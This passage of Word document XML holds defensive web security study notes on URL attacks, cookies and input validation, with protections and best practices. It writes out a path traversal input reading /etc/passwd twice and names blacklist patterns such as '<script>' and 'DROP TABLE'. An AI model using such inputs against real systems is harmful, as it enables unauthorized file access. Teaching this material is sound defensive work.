    <w:p w14:paraId="42881D3D" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Directory Traversal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AD69023" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>../../</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>passwd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> → access restricted files.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14648CE6" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Injection Attacks (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>SQLi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>, XSS)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="707E0288" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Malicious code inserted in query parameters.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D341757" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Phishing / Homograph Attacks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="427028DE" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Fake domains that look like real ones (g00gle.com).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63DC9254" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="67" w:name="_Toc208408538"/>
      <w:r>
        <w:t>Protections</w:t>
      </w:r>
      <w:bookmarkEnd w:id="67"/>
    </w:p>
    <w:p w14:paraId="1FE69DDF" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Validate &amp; sanitize query parameters.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D43496D" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Use allow-lists for redirects.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4964DD7F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Enforce proper URL encoding.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D923790" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Apply WAF rules against injection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D6A74C4" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Educate users about phishing URLs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="680E5ACB" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="68" w:name="_Toc208408539"/>
      <w:r>
        <w:t>Cookies</w:t>
      </w:r>
      <w:bookmarkEnd w:id="68"/>
    </w:p>
    <w:p w14:paraId="09BE048D" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A cookie is a small piece of data stored on the client’s browser by the server.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">It is sent back to the server with subsequent requests to maintain </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>stateful</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> sessions in the otherwise stateless HTTP protocol.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59C150CA" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="69" w:name="_Toc208408540"/>
      <w:r>
        <w:t>How Cookies Work</w:t>
      </w:r>
      <w:bookmarkEnd w:id="69"/>
    </w:p>
    <w:p w14:paraId="68453EBB" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Server sets a cookie using the Set-Cookie HTTP response header.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4384749C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Set-Cookie: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sessionId</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">=abc123; Path=/; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>HttpOnly</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>; Secure</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B7A54FF" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Browser stores the cookie locally.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F1B89B0" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>On the next request, browser automatically attaches cookie in request header:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E7DF09D" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Cookie: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sessionId</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>=abc123</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5084A268" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Server identifies the session/user and responds accordingly.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B5754CA" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="70" w:name="_Toc208408541"/>
      <w:r>
        <w:t>Types of Cookies</w:t>
      </w:r>
      <w:bookmarkEnd w:id="70"/>
    </w:p>
    <w:p w14:paraId="305C772A" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Session Cookies → Temporary, deleted when browser closes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66545F6C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Persistent Cookies → Remain until expiration.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DDD91EB" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>First-Party Cookies → Set by the site you visit.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4833BC7D" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Third-Party Cookies → Set by external domains (ads, trackers).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03D2D244" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Secure Cookies → Sent only over HTTPS.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49D93FC9" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Zombie Cookies → Reappear even after deletion (tracking technique).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E70EDFE" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="71" w:name="_Toc208408542"/>
      <w:r>
        <w:t>Cookie Attributes</w:t>
      </w:r>
      <w:bookmarkEnd w:id="71"/>
    </w:p>
    <w:p w14:paraId="3D66F94C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Name=Value → The key-value pair (user=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>aditya</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3276B226" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Domain → Defines which domain can access it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E9D37F8" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Path → Restricts cookie to a specific path.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4078E89B" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Expires / Max-Age → Lifespan of the cookie.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79804F08" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Secure → Sent only over HTTPS.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A64E61C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>HttpOnly</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> → Not accessible via JavaScript (protects from XSS).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BDC91EC" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>SameSite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> → Controls cross-site cookie behavior:</w:t>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="77D6C4BA" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Strict (only first-party)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0546040B" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Lax (safe cross-site, e.g., links)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A15BFD5" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>None (sent everywhere, must be Secure).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F6D442A" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="72" w:name="_Toc208408543"/>
      <w:r>
        <w:t>Vulnerabilities &amp; Attacks</w:t>
      </w:r>
      <w:bookmarkEnd w:id="72"/>
    </w:p>
    <w:p w14:paraId="7DDCEDC6" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Session Hijacking → If cookies are stolen (via XSS, MITM).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F9AC210" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Cross-Site Scripting (XSS) → Attacker injects script to steal cookies.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F13A07B" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Cross-Site Request Forgery (CSRF) → Exploits cookies auto-sent with requests.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F0038CA" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Session Fixation → Forcing victim to use a known session ID.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="468FA0BB" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Unencrypted Cookies → Can be sniffed over HTTP.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F160FD0" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="73" w:name="_Toc208408544"/>
      <w:r>
        <w:t>Protections</w:t>
      </w:r>
      <w:bookmarkEnd w:id="73"/>
    </w:p>
    <w:p w14:paraId="5C6944ED" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Always use Secure + </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>HttpOnly</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> flags.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D8611F0" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Implement </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>SameSite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>=Lax/Strict for CSRF protection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B6AF5DC" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Encrypt sensitive data inside cookies.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4166D250" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Use short expiration for session cookies.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="209F154A" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Prefer server-side sessions with tokens instead of storing sensitive info client-side.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="120083A3" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="74" w:name="_Toc208408545"/>
      <w:r>
        <w:t>Input Validation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="74"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38C6D031" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Input validation is the process of ensuring that user-provided data is correct, safe, and expected before it is processed by an application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E2DC8AF" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>It prevents malicious input from triggering vulnerabilities like SQL Injection, XSS, buffer overflow, and command injection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D78B617" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="75" w:name="_Toc208408546"/>
      <w:r>
        <w:t>How Input Validation Works</w:t>
      </w:r>
      <w:bookmarkEnd w:id="75"/>
    </w:p>
    <w:p w14:paraId="1AEE8C5D" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Define expected input</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C8B96F0" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Data type (string, integer, email, etc.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="222A5626" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Format (regex, allowed characters)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D37A4EE" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Length limits (min/max)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ABF0FFB" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Validate input at the server-side</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ED50200" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Client-side validation is useful for user experience, but cannot be trusted.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CBA9079" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Server must always enforce validation rules.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C451698" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Reject or sanitize unexpected input</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3180BE9B" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Remove dangerous characters (e.g., &lt; &gt; ‘ “ ; --).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="331CFDAD" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Encode output where required (HTML, URL, SQL escaping).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A3CA69E" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="76" w:name="_Toc208408547"/>
      <w:r>
        <w:t>Types of Input Validation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="76"/>
    </w:p>
    <w:p w14:paraId="03D0F443" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Whitelist Validation (Preferred) – Only allow expected characters/data (e.g., digits only for phone numbers).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0237615F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Blacklist Validation – Block known bad patterns (&lt;script&gt;, DROP TABLE).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="219F2160" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Syntactic Validation – Checks format (e.g., </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>dd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>-mm-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>yyyy</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> for dates).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70D02BA1" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Semantic Validation – Checks logic (e.g., start date &lt; end date).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D26A277" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="77" w:name="_Toc208408548"/>
      <w:r>
        <w:t>Vulnerabilities</w:t>
      </w:r>
      <w:bookmarkEnd w:id="77"/>
    </w:p>
    <w:p w14:paraId="4E33AD7C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SQL Injection (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>SQLi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>) → Malicious SQL queries in input.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F934A6F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Cross-Site Scripting (XSS) → Script injection in forms/URLs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="409B5CBD" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Command Injection → Shell commands executed via input.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2341A564" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Path Traversal → ../../</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>passwd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> file access.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2872A1EE" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Buffer Overflow → Excessive input causing memory corruption.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50BAEE91" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="78" w:name="_Toc208408549"/>
      <w:r>
        <w:t>Best Practices</w:t>
      </w:r>
      <w:bookmarkEnd w:id="78"/>
    </w:p>
    <w:p w14:paraId="2E5F18FA" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Validate on the server-side (don’t rely only on JavaScript).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="114E02AB" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Use whitelisting instead of blacklisting.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78C91769" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
